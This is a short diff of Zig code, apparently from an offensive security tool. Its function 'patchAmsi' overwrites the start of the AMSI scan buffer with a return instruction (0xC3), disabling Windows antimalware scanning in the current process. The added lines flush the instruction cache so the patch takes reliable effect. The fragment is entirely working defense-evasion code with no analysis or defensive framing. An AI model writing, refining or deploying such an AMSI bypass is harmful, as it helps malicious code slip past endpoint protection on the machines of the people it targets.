@@ -33,6 +33,12 @@ pub fn patchAmsi() bool {
     const patch_slice = @as(*volatile [1]u8, @ptrCast(@alignCast(scan_buffer)));
     patch_slice[0] = 0xC3;
 
+    _ = engine.NtFlushInstructionCache(
+        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
+        @as(types.PVOID, @ptrCast(@alignCast(scan_buffer))),
+        1,
+    );
+
     prot_base = @ptrCast(@alignCast(scan_buffer));
     prot_size = 1;
     _ = engine.NtProtectVirtualMemory(
